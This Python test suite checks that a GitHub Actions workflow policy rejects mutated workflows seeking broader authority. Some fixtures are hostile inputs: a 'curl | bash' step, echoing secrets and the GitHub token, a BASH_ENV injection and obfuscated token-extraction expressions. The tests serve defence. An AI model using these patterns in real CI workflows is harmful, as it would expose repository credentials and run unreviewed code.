# SPDX-License-Identifier: GPL-3.0-or-later
"""Mutate real workflow documents; the policy must reject broader authority."""
from __future__ import annotations
import copy
from pathlib import Path
import sys
import tempfile
import unittest
import yaml

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "scripts"))
import workflow_policy as policy


def load(name):
    return yaml.load((ROOT / ".github/workflows" / name).read_text(), Loader=policy.WorkflowLoader)


class WorkflowPolicyTests(unittest.TestCase):
    def setUp(self):
        self.document = load("verify.yml")
        self.release = load("release.yml")

    def reject(self, doc, name="verify.yml"):
        self.assertTrue(policy.check_document(name, doc))

    def test_real_workflows_and_mandatory_gate_use_this_policy(self):
        self.assertEqual(policy.check(ROOT), [])
        self.assertIn("python3 scripts/workflow_policy.py", (ROOT / "scripts/verify").read_text())

    def test_verification_is_manual_only(self):
        self.assertEqual(self.document['on'], {'workflow_dispatch': None})
        for event, options in [('push', {'branches': ['master']}),
                               ('pull_request', None),
                               ('schedule', [{'cron': '23 7 * * *'}]),
                               ('workflow_run', {'workflows': ['Build'], 'types': ['completed']})]:
            for replace in (False, True):
                doc = copy.deepcopy(self.document)
                if replace: doc['on'] = {}
                doc['on'][event] = options
                self.reject(doc)

    def test_scheduled_workflows_require_the_production_guard(self):
        for name in ('release.yml', 'bootstrap.yml'):
            original = load(name)
            self.assertEqual(original['jobs']['prepare']['if'], policy.MAINTENANCE_GUARD)
            for guard in (None, 'true', policy.MAINTENANCE_GUARD.replace('assboxai/assbox', 'buu700/assbox-dev'),
                          "github.event_name == 'schedule'"):
                doc = copy.deepcopy(original)
                if guard is None: del doc['jobs']['prepare']['if']
                else: doc['jobs']['prepare']['if'] = guard
                self.reject(doc, name)

    def test_scheduled_jobs_cannot_escape_the_production_guard(self):
        for name in ('release.yml', 'bootstrap.yml'):
            original = load(name)
            for job in set(original['jobs']) - {'prepare'}:
                for change in ('independent', 'always', 'cancelled'):
                    doc = copy.deepcopy(original)
                    if change == 'independent': doc['jobs'][job].pop('needs', None)
                    else: doc['jobs'][job]['if'] = change + '()'
                    self.reject(doc, name)
            doc = copy.deepcopy(original)
            doc['jobs']['extra'] = copy.deepcopy(doc['jobs']['prepare'])
            del doc['jobs']['extra']['if']
            self.reject(doc, name)

    def test_verification_stages_cannot_be_skipped_reordered_or_extended(self):
        for change in ('omit', 'reorder', 'duplicate', 'condition', 'arguments'):
            doc = copy.deepcopy(self.document)
            steps = doc['jobs']['verify']['steps']
            index = next(i for i, step in enumerate(steps) if step.get('run') == policy.VERIFY_COMMANDS[0])
            if change == 'omit': steps.pop(index)
            elif change == 'reorder': steps[index], steps[index + 1] = steps[index + 1], steps[index]
            elif change == 'duplicate': steps.insert(index, copy.deepcopy(steps[index]))
            elif change == 'condition': steps[index]['if'] = 'false'
            else: steps[index]['run'] += ' --skip'
            self.reject(doc)

    def test_verification_artifact_exception_is_exact_and_confined(self):
        for change in ('path', 'retention-days', 'condition', 'env', 'action', 'remove'):
            doc = copy.deepcopy(self.document)
            step = doc['jobs']['verify']['steps'][-1]
            if change == 'path': step['with']['path'] = '${{ runner.temp }}'
            elif change == 'retention-days': step['with']['retention-days'] = 90
            elif change == 'condition': step['if'] = 'success()'
            elif change == 'env': step['env'] = {'GH_TOKEN': '${{ github.token }}'}
            elif change == 'action': step['uses'] = 'actions/upload-artifact@main'
            else: doc['jobs']['verify']['steps'].pop()
            self.reject(doc)
        self.reject(self.document, 'other.yml')

    def test_yaml_on_key_is_not_boolean_and_duplicate_keys_are_refused(self):
        self.assertIn("workflow_dispatch", self.document["on"])
        for source in ["on: {}\non: {}\n", "permissions:\n  contents: read\n  contents: write\n", "true: value\n"]:
            with self.assertRaises(ValueError): yaml.load(source, Loader=policy.WorkflowLoader)

    def test_workflow_and_job_token_escalation_and_implicit_permissions_refused(self):
        for setting in [None, "write-all", "read-all", {"contents": "write"}, {"id-token": "write"}]:
            for level in ["workflow", "job"]:
                d = copy.deepcopy(self.document)
                target = d if level == "workflow" else d["jobs"]["verify"]
                if setting is None: target.pop("permissions", None)
                else: target["permissions"] = setting
                # An absent job override correctly inherits the explicit read default.
                if setting is None and level == "job": self.assertEqual(policy.check_document("verify.yml", d), [])
                else: self.reject(d)

    def test_environment_secrets_reusable_workflows_services_and_containers_refused(self):
        for key, value in [("environment", "prod"), ("secrets", "inherit"), ("uses", "org/project/.github/workflows/run.yml@master"),
                           ("container", "image"), ("services", {}), ("env", {"KEY": "value"})]:
            d = copy.deepcopy(self.document); d["jobs"]["verify"][key] = value; self.reject(d)

    def test_hidden_token_and_secret_contexts_refused(self):
        for expression in ["${{ secrets.RELEASE_KEY }}", "${{ secrets['RELEASE_KEY'] }}", "${{ github.token }}", "${{ github['token'] }}"]:
            d = copy.deepcopy(self.document); d["name"] = expression; self.reject(d)
        d = copy.deepcopy(self.document); d["env"] = {"BASH_ENV": "/tmp/evil"}; self.reject(d)

    def test_release_token_access_is_rejected_at_every_nonbinding_location(self):
        expressions = ["${{ github.token }}", "${{ github['token'] }}",
                       "${{ GITHUB . TOKEN }}"]
        # Test every job, including the privileged jobs, not just prepare.
        for job_name in self.release["jobs"]:
            for expression in expressions:
                for field, value in [
                    ("outputs", {"leak": expression}), ("if", expression),
                    ("needs", [expression]),
                    ("strategy", {"matrix": {"leak": [expression]}}),
                    ("timeout-minutes", expression),
                ]:
                    with self.subTest(job=job_name, field=field, expression=expression):
                        doc = copy.deepcopy(self.release)
                        doc["jobs"][job_name][field] = value
                        self.reject(doc, "release.yml")
        for field, value in [("name", "${{ github.token }}"),
                             ("concurrency", {"group": "${{ github.token }}"})]:
            doc = copy.deepcopy(self.release)
            doc[field] = value
            self.reject(doc, "release.yml")
        doc = copy.deepcopy(self.release)
        doc["jobs"]["prepare"]["outputs"] = {"${{ github.token }}": "value"}
        self.reject(doc, "release.yml")

    def test_whole_or_dynamic_github_context_cannot_export_credentials(self):
        expressions = ["${{ toJSON(github) }}", "${{ github }}", "${{ github.* }}",
                       "${{ github[format('{0}{1}', 'to', 'ken')] }}",
                       "${{ github[env.PROPERTY] }}", "${{ toJSON(github)['token'] }}",
                       "${{ format('}}{0}', toJSON(github)) }}"]
        for name, original, job_name in [("release.yml", self.release, "prepare"),
                                         ("verify.yml", self.document, "verify")]:
            for expression in expressions:
                with self.subTest(name=name, expression=expression):
                    doc = copy.deepcopy(original)
                    doc["jobs"][job_name]["outputs"] = {"leak": expression}
                    self.reject(doc, name)
        doc = copy.deepcopy(self.release)
        doc["jobs"]["prepare"]["if"] = "toJSON(github) != ''"
        self.reject(doc, "release.yml")

    def test_quoted_expression_braces_and_bare_conditions_cannot_hide_secrets(self):
        for expression in ["${{ format('}}{0}', secrets.KEY) }}", "${{ toJSON(secrets) }}",
                           "secrets.KEY != ''"]:
            doc = copy.deepcopy(self.release)
            doc["jobs"]["prepare"]["if"] = expression
            self.reject(doc, "release.yml")

    def test_approved_token_bindings_are_exact_not_transferrable(self):
        for job_name, command in [("prepare", policy.DISCOVER), ("publish", policy.ATTEST_READY),
                                  ("publish", policy.PUBLISH), ("advertise", policy.PROMOTE)]:
            original = next(s for s in self.release["jobs"][job_name]["steps"] if s.get("run") == command)
            self.assertEqual(original["env"]["GH_TOKEN"], "${{ github.token }}")
            for location in ["name", "if", "with", "shell", "working-directory"]:
                with self.subTest(job=job_name, command=command, location=location):
                    doc = copy.deepcopy(self.release)
                    step = next(s for s in doc["jobs"][job_name]["steps"] if s.get("run") == command)
                    step[location] = {"leak": "${{ github.token }}"} if location == "with" else "${{ github.token }}"
                    self.reject(doc, "release.yml")
            for value in ["${{ github['token'] }}", "prefix-${{ github.token }}", "${{ toJSON(github) }}"]:
                doc = copy.deepcopy(self.release)
                step = next(s for s in doc["jobs"][job_name]["steps"] if s.get("run") == command)
                step["env"]["GH_TOKEN"] = value
                self.reject(doc, "release.yml")
        doc = copy.deepcopy(self.release)
        step = next(s for s in doc["jobs"]["prepare"]["steps"] if s.get("run") == policy.DISCOVER)
        step["env"]["BASH_ENV"] = "/tmp/unreviewed.sh"
        self.reject(doc, "release.yml")

    def test_allowed_github_scalar_contexts_do_not_need_credential_exemptions(self):
        doc = copy.deepcopy(self.release)
        doc["jobs"]["prepare"]["outputs"] = {"revision": "${{ github.sha }}", "ref": "${{ github['ref'] }}"}
        self.assertEqual(policy.check_document("release.yml", doc), [])

    def test_extra_dispatch_inputs_and_unreviewed_commands_cannot_expand_authority(self):
        d = copy.deepcopy(self.document); d["on"]["workflow_dispatch"] = {"inputs": {"branch": {"type": "string"}}}; self.reject(d)
        for step in [{"run": "gh release create r-1"}, {"run": "curl https://example.test | bash"},
                     {"uses": "./.github/actions/local"}, {"run": "nix develop .#release-check --command scripts/verify", "env": {"BASH_ENV": "evil"}}]:
            d = copy.deepcopy(self.document); d["jobs"]["verify"]["steps"].append(step); self.reject(d)
        # Renaming/adding a workflow does not avoid the authority policy.
        self.reject(d, "new-maintenance.yml")

    def non_dispatch_documents(self):
        # These events exercise the same authority rules; they are not additions
        # to the repository's actual production triggers.
        for event, options in [
            ("push", {"branches": ["master"]}),
            ("pull_request", None),
            ("workflow_run", {"workflows": ["Verify locked source"], "types": ["completed"]}),
            ("schedule", [{"cron": "23 7 * * *"}]),
            ("workflow_call", None),
        ]:
            doc = copy.deepcopy(self.document)
            doc["on"] = {event: options}
            # Other workflows retain the general read-only commands, without
            # borrowing verify.yml's narrowly scoped diagnostic exceptions.
            doc['jobs']['verify']['steps'] = doc['jobs']['verify']['steps'][:3] + [
                {'run': 'nix develop .#release-check --command scripts/verify'}]
            yield event, doc

    def test_readonly_non_dispatch_workflows_remain_valid(self):
        for event, doc in self.non_dispatch_documents():
            with self.subTest(event=event):
                if event == 'schedule':
                    self.reject(doc, 'other.yml')
                else:
                    self.assertEqual(policy.check_document("other.yml", doc), [])

    def test_non_dispatch_workflows_cannot_gain_write_permissions_or_secret_grants(self):
        for event, original in self.non_dispatch_documents():
            for key, value in [("permissions", {"contents": "write"}),
                               ("permissions", {"contents": "read", "id-token": "write"}),
                               ("environment", "production"), ("secrets", "inherit")]:
                with self.subTest(event=event, key=key, value=value):
                    doc = copy.deepcopy(original)
                    doc["jobs"]["verify"][key] = value
                    self.reject(doc, "push-only.yml")
            doc = copy.deepcopy(original)
            doc["permissions"] = "write-all"
            self.reject(doc, "other.yml")

    def test_non_dispatch_workflows_cannot_bypass_effect_and_token_rules(self):
        for event, original in self.non_dispatch_documents():
            for step in [{"run": "gh release create r-1"},
                         {"uses": "./.github/actions/local"},
                         {"run": "echo ${{ secrets.RELEASE_KEY }}"},
                         {"run": "echo ${{ github.token }}"}]:
                with self.subTest(event=event, step=step):
                    doc = copy.deepcopy(original)
                    doc["jobs"]["verify"]["steps"].append(step)
                    self.reject(doc, "other.yml")
            doc = copy.deepcopy(original)
            doc["jobs"]["verify"]["runs-on"] = "self-hosted"
            self.reject(doc, "other.yml")

    def test_new_non_dispatch_workflow_files_are_scanned(self):
        for suffix in ["yml", "yaml"]:
            with self.subTest(suffix=suffix), tempfile.TemporaryDirectory() as temp:
                root = Path(temp)
                workflows = root / ".github/workflows"
                workflows.mkdir(parents=True)
                doc = next(self.non_dispatch_documents())[1]
                target = workflows / f"new-push-only.{suffix}"
                target.write_text(yaml.safe_dump(doc))
                self.assertEqual(policy.check(root), [])
                doc["jobs"]["verify"]["permissions"] = {"contents": "write"}
                doc["jobs"]["verify"]["environment"] = "production"
                doc["jobs"]["verify"]["steps"].append({"run": "echo ${{ secrets.RELEASE_KEY }}"})
                target.write_text(yaml.safe_dump(doc))
                self.assertTrue(policy.check(root))

    def test_release_exceptions_require_the_exact_workflow_and_trigger(self):
        self.assertEqual(policy.check_document("release.yml", self.release), [])
        self.reject(copy.deepcopy(self.release), "other-release.yml")
        for event, _ in self.non_dispatch_documents():
            doc = copy.deepcopy(self.release)
            doc["on"] = {event: None}
            self.reject(doc, "release.yml")
            self.reject(doc, "other-release.yml")
        doc = next(self.non_dispatch_documents())[1]
        doc["jobs"]["publish"] = doc["jobs"].pop("verify")
        doc["jobs"]["publish"]["permissions"] = {"contents": "write"}
        self.reject(doc, "other.yml")

    def test_reusable_workflow_secret_declarations_are_refused(self):
        doc = next(self.non_dispatch_documents())[1]
        doc["on"] = {"workflow_call": {"secrets": {"RELEASE_KEY": {"required": True}}}}
        self.reject(doc, "reusable.yml")

    def test_empty_or_implicit_event_definitions_are_refused(self):
        for events in [None, {}, "push", ["push", "workflow_dispatch"]]:
            with self.subTest(events=events):
                doc = copy.deepcopy(self.document)
                doc["on"] = events
                self.reject(doc)

    def test_checkout_action_options_and_self_hosted_runner_changes_refused(self):
        d = copy.deepcopy(self.document); d["jobs"]["verify"]["steps"][0]["with"]["persist-credentials"] = True; self.reject(d)
        d = copy.deepcopy(self.document); d["jobs"]["verify"]["steps"][0]["uses"] = "actions/checkout@master"; self.reject(d)
        d = copy.deepcopy(self.document); d["jobs"]["verify"]["runs-on"] = "self-hosted"; self.reject(d)
        d = copy.deepcopy(self.document); d["jobs"]["verify"]["strategy"]["matrix"]["include"][0]["runner"] = "self-hosted"; self.reject(d)

    def test_only_designated_release_jobs_can_publish_or_request_oidc(self):
        for name in ["native", "live-verify", "prepare"]:
            d = copy.deepcopy(self.release); d["jobs"][name]["permissions"] = {"contents": "write"}; self.reject(d, "release.yml")
        d = copy.deepcopy(self.release); d["jobs"]["surprise"] = copy.deepcopy(d["jobs"]["publish"]); self.reject(d, "release.yml")
        d = copy.deepcopy(self.release); d["jobs"]["publish"]["environment"] = "other"; self.reject(d, "release.yml")

    def test_privileged_actions_cannot_change_checkout_or_overwrite_trusted_programs(self):
        for job_name in ["publish", "advertise"]:
            d = copy.deepcopy(self.release); d["jobs"][job_name]["steps"][0]["with"]["ref"] = "other"; self.reject(d, "release.yml")
        d = copy.deepcopy(self.release)
        step = next(s for s in d["jobs"]["publish"]["steps"] if s.get("uses") == policy.DOWNLOAD)
        step["with"]["path"] = "scripts"
        self.reject(d, "release.yml")
        d = copy.deepcopy(self.release)
        d["jobs"]["publish"]["steps"].append({"run": "nix build path:/tmp/candidate"})
        self.reject(d, "release.yml")

    def test_attestation_must_immediately_follow_current_head_and_evidence_guard(self):
        for replacement in ["python3 scripts/release.py ready assets reports", "true"]:
            d = copy.deepcopy(self.release)
            step = next(s for s in d["jobs"]["publish"]["steps"] if s.get("run", "").startswith("python3 scripts/release.py attest-ready"))
            step["run"] = replacement; self.reject(d, "release.yml")
        d = copy.deepcopy(self.release)
        i = next(i for i, s in enumerate(d["jobs"]["publish"]["steps"]) if s.get("uses") == policy.ATTEST)
        d["jobs"]["publish"]["steps"].insert(i, {"run": "sleep 120"})
        self.reject(d, "release.yml")

    def test_tokens_cannot_reach_candidate_builds_or_other_privileged_environments(self):
        d = copy.deepcopy(self.release)
        step = next(s for s in d["jobs"]["live-verify"]["steps"] if "run" in s)
        step["env"]["GH_TOKEN"] = "${{ github.token }}"; self.reject(d, "release.yml")
        d = copy.deepcopy(self.release)
        step = next(s for s in d["jobs"]["publish"]["steps"] if s.get("run") == policy.PUBLISH)
        step["env"]["BASH_ENV"] = "unreviewed.sh"; self.reject(d, "release.yml")

    def test_advertisement_cannot_skip_failed_matrix_or_remove_candidate_verification(self):
        d = copy.deepcopy(self.release); d["jobs"]["advertise"]["if"] = "always()"; self.reject(d, "release.yml")
        d = copy.deepcopy(self.release); d["jobs"]["advertise"]["needs"] = ["publish"]; self.reject(d, "release.yml")
        d = copy.deepcopy(self.release); del d["jobs"]["live-verify"]; self.reject(d, "release.yml")
        d = copy.deepcopy(self.release)
        step = next(s for s in d["jobs"]["live-verify"]["steps"] if "run" in s)
        step["run"] = "echo passed"; self.reject(d, "release.yml")
        live = self.release["jobs"]["live-verify"]
        self.assertEqual({row["system"] for row in live["strategy"]["matrix"]["include"]}, {"aarch64-linux", "x86_64-linux"})
        command = next(s["run"] for s in live["steps"] if "run" in s)
        self.assertIn("scripts/release.py live-verify", command)
        self.assertIn("GITHUB_RUN_ATTEMPT", command)

    def test_bootstrap_writer_cannot_expand_its_authority_or_bypass_native_evidence(self):
        original = load("bootstrap.yml")
        mutations = [
            lambda d: d["jobs"]["write"].update(needs=["prepare"]),
            lambda d: d["jobs"]["write"].update({"if": "always()"}),
            lambda d: d["jobs"]["write"].update(environment="unprotected"),
            lambda d: d["jobs"]["write"].update(permissions={"contents": "write", "actions": "write"}),
            lambda d: d["jobs"]["write"]["steps"].append({"run": "nix build path:/tmp/candidate"}),
            lambda d: d["jobs"]["write"]["steps"][0]["with"].update(ref="master"),
            lambda d: d["jobs"]["write"]["steps"][0]["with"].update({"persist-credentials": True}),
            lambda d: d["jobs"]["write"]["steps"][1]["with"].update(path="scripts"),
            lambda d: d["jobs"]["native"]["strategy"]["matrix"]["include"].pop(),
            lambda d: d["jobs"]["native"].update({"continue-on-error": True}),
            lambda d: d["jobs"]["native"].update(env={"GH_TOKEN": "${{ github.token }}"}),
            lambda d: d["jobs"]["prepare"]["steps"].reverse(),
            lambda d: d["on"].update(push={"branches": ["master"]}),
            lambda d: d["concurrency"].update({"cancel-in-progress": True}),
        ]
        for mutate in mutations:
            with self.subTest(mutation=mutations.index(mutate)):
                document = copy.deepcopy(original); mutate(document)
                self.reject(document, "bootstrap.yml")
        self.reject(original, "renamed-bootstrap.yml")

    def test_bootstrap_token_binding_cannot_be_reused_or_redirected(self):
        original = load("bootstrap.yml")
        for job_name, command in [("prepare", policy.BOOTSTRAP_DISCOVER), ("write", policy.BOOTSTRAP_WRITE)]:
            for change in [{"shell": "bash"}, {"working-directory": "/tmp/candidate"},
                           {"if": "always()"}, {"env": {"GH_TOKEN": "${{ github.token }}", "BASH_ENV": "candidate.sh"}}]:
                with self.subTest(job=job_name, change=change):
                    document = copy.deepcopy(original)
                    step = next(s for s in document["jobs"][job_name]["steps"] if s.get("run") == command)
                    step.update(change)
                    self.reject(document, "bootstrap.yml")


if __name__ == "__main__": unittest.main()
